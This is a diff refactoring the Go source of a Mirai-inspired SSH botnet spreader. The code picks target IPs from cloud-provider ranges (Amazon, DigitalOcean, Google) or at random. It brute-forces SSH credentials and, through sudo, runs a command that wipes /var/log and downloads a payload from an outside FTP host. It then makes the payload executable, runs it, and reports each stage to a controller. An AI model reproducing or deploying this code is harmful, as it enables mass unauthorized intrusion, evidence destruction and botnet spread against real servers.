@@ -63,25 +63,18 @@ var (
 	//////////////////////////////////////////////////////////////////////////
 
 	//Amazon.com, Inc.
-	az1  = "3.14"   //3.14.255.255
-	az2  = "3.20"   //3.20.255.255
-	az3  = "3.21"   //3.21.255.255
-	az4  = "3.130"  //3.130.255.255
-	az5  = "3.131"  //3.131.255.255
-	az6  = "3."     //3.139.0.0 - 3.145.255.255
-	az7  = "3.209"  //3.209.255.255
-	az8  = "44.194" //44.194.255.255
-	az9  = "44.235" //44.235.255.255
-	az10 = "18.188" //18.188.255.255
-	az11 = "18.191" //18.191.255.255
-	az12 = "18.212" //18.212.255.255
-	az13 = "18."    //18.217.0.0 - 18.220.255.255
-	az14 = "18.222" //18.222.255.255
-	az15 = "18.233" //18.233.255.255
-	az16 = "54.83"  //54.83.255.255
-	az17 = "54.86"  //54.86.255.255
-	az18 = "54.214" //54.214.255.255
-	az19 = "54.162" //54.162.255.255
+	amz1  = "44.194" //44.194.255.255
+	amz2  = "44.235" //44.235.255.255
+	amz3  = "18.188" //18.188.255.255
+	amz4  = "18.191" //18.191.255.255
+	amz5  = "18.212" //18.212.255.255
+	amz6  = "18."    //18.217.0.0 - 18.220.255.255
+	amz7  = "18.222" //18.222.255.255
+	amz8  = "18.233" //18.233.255.255
+	amz9  = "54.83"  //54.83.255.255
+	amz10 = "54.86"  //54.86.255.255
+	amz11 = "54.214" //54.214.255.255
+	amz12 = "54.162" //54.162.255.255
 
 	//DigitalOcean, LLC
 	ocean1  = "64.225"  //64.225.255.255
@@ -125,10 +118,10 @@ var CN_netList = []string{
 }
 
 var USA_netList = []string{
-	az1, az2, az3, az4, az5, az6, az7, az8, az9, az10,
-	az11, az12, az13, az14, az15, az16, az17, az18, az19,
-	ocean1, ocean2, ocean3, ocean4, ocean5, ocean6, ocean7, ocean8, ocean9, ocean10,
-	ocean11, ocean12, ocean13,
+	amz1, amz2, amz3, amz4, amz5, amz6, amz7, amz8,
+	amz9, amz10, amz11, amz12,
+	ocean1, ocean2, ocean3, ocean4, ocean5, ocean6, ocean7, ocean8,
+	ocean9, ocean10, ocean11, ocean12, ocean13,
 	google1, google2, google3, google4, google5, google6, google7, google8,
 }
 
@@ -139,9 +132,9 @@ func genRange(max, min int) string {
 	return fmt.Sprint(rand.Intn(max+1-min) + min)
 }
 
-func (scan *SCAN) manageRange(secondRange string) string {
+func (bot *BOT) manageRange(secondRange string) string {
 	var ipGen []string
-	ipGen = append(ipGen, scan.ipRange)
+	ipGen = append(ipGen, bot.network)
 	ipGen = append(ipGen, secondRange, ".")
 
 	for i := 0; i < 2; i++ {
@@ -154,24 +147,22 @@ func (scan *SCAN) manageRange(secondRange string) string {
 		ipGen[4] + ipGen[5] + ipGen[6] + ipGen[7]
 }
 
-func (scan *SCAN) nextIP() string {
-	switch scan.ipRange {
+func (bot *BOT) nextIP() string {
+	switch bot.network {
 	case cspn1:
-		return scan.manageRange(genRange(250, 246))
-	case az6:
-		return scan.manageRange(genRange(145, 139))
-	case az13:
-		return scan.manageRange(genRange(220, 217))
+		return bot.manageRange(genRange(250, 246))
+	case amz6:
+		return bot.manageRange(genRange(145, 139))
 	case ocean2:
-		return scan.manageRange(genRange(90, 62))
+		return bot.manageRange(genRange(90, 62))
 	case ocean5:
-		return scan.manageRange(genRange(194, 188))
+		return bot.manageRange(genRange(194, 188))
 	case google6:
-		return scan.manageRange(genRange(136, 133))
+		return bot.manageRange(genRange(136, 133))
 	case Random_netList[0]:
-		return scan.manageRange(genRange(255, 0))
+		return bot.manageRange(genRange(255, 0))
 	default:
-		return scan.manageRange("")
+		return bot.manageRange("")
 	}
 }
 
@@ -196,15 +187,15 @@ func sshConfig(sshName, sshPass string) *ssh.ClientConfig {
 	return config
 }
 
-func (scan *SCAN) sshSession(comd string) {
-	session, _ := scan.s_session.NewSession()
-	var set_session bytes.Buffer
-	session.Stdout = &set_session
-	session.Run("echo " + scan.s_paswd + " | sudo -S " + comd)
-	session.Close()
+func (bot *BOT) Execute(comd string) {
+	sshSession, _ := bot.session.NewSession()
+	var setSession bytes.Buffer
+	sshSession.Stdout = &setSession
+	sshSession.Run("echo " + bot.password + " | sudo -S " + comd)
+	sshSession.Close()
 }
 
-func (irc *IRC) BotScanner(modes []string, ftp, payload string, isRandom bool) {
+func (bot *BOT) Scanner(modes []string, isRandom bool) {
 	/*
 		Thank mirai for these usernames and passwords list. (You are my inspirelation.)
 		Add more usernames and passwords in to The slice name "userList" and "paswdList".
@@ -225,40 +216,40 @@ func (irc *IRC) BotScanner(modes []string, ftp, payload string, isRandom bool) {
 		for net := range modes {
 			if isRandom {
 				gen := genRange(255, 0) + "."
-				if gen == "192." || gen == "127." || gen == "0." || gen == "100." {
+				//Blacklists IP
+				if gen == "127." || gen == "0." || gen == "3." || gen == "15." ||
+					gen == "56." || gen == "10." || gen == "192." || gen == "172." ||
+					gen == "100." || gen == "169." || gen == "198." || gen == "224." {
 					continue
 				}
 				Random_netList[0] = gen
 			}
-			scan := &SCAN{
-				ipRange: modes[net],
-			}
-			ip := scan.nextIP()
+			bot.network = modes[net]
+			ip := bot.nextIP()
 			_ptrIP := &ip
 			rtnIP := checkPort(*_ptrIP)
 
 			if rtnIP == "" {
 				checkPort(ip)
 			} else {
-				irc.IRCreport("Try to login: " + rtnIP)
+				bot.Report("Try to login: " + rtnIP)
 				var isLogin bool
 
 				for user := range userList {
 					for paswd := range paswdList {
-						_session, err := ssh.Dial("tcp", rtnIP, sshConfig(userList[user], paswdList[paswd]))
-						scan := &SCAN{
-							s_session: _session,
-							s_paswd:   paswdList[paswd],
-						}
+						sshConn, err := ssh.Dial("tcp", rtnIP, sshConfig(userList[user], paswdList[paswd]))
+						bot.session = sshConn
+						bot.password = paswdList[paswd]
 						if err == nil {
-							irc.IRCreport("Login success: " + rtnIP)
-							scan.sshSession("rm -rf /var/log/ && wget -O ." + payload + " " + ftp)
-							irc.IRCreport("Loading bot: " + rtnIP)
-							go scan.sshSession("chmod +x ." + payload + " && ./." + payload)
+							bot.payload = name('a')
+							bot.Report("Login success: " + rtnIP)
+							bot.Execute("rm -rf /var/log/ && wget -O ." + bot.payload + " " + bot.ftp)
+							bot.Report("Loading bot: " + rtnIP)
+							go bot.Execute("chmod 700 ." + bot.payload + " && ./." + bot.payload)
 							isLogin = true
 							break
 						} else {
-							irc.IRCreport("Failed to login: " + rtnIP + " > " +
+							bot.Report("Failed to login: " + rtnIP + " > " +
 								fmt.Sprintf("%v:%v", userList[user], paswdList[paswd]))
 						}
 					}
@@ -275,13 +266,14 @@ func (irc *IRC) BotScanner(modes []string, ftp, payload string, isRandom bool) {
 	}
 }
 
-func (irc *IRC) ScanMode(modes, ftp, payload string) {
+func (bot *BOT) ScanMode(modes, ftpServer string) {
+	bot.ftp = ftpServer
 	switch {
 	case modes == "-usa":
-		irc.BotScanner(USA_netList, ftp, payload, false)
+		bot.Scanner(USA_netList, false)
 	case modes == "-cn":
-		irc.BotScanner(CN_netList, ftp, payload, false)
+		bot.Scanner(CN_netList, false)
 	case modes == "-r":
-		irc.BotScanner(Random_netList, ftp, payload, true)
+		bot.Scanner(Random_netList, true)
 	}
 }
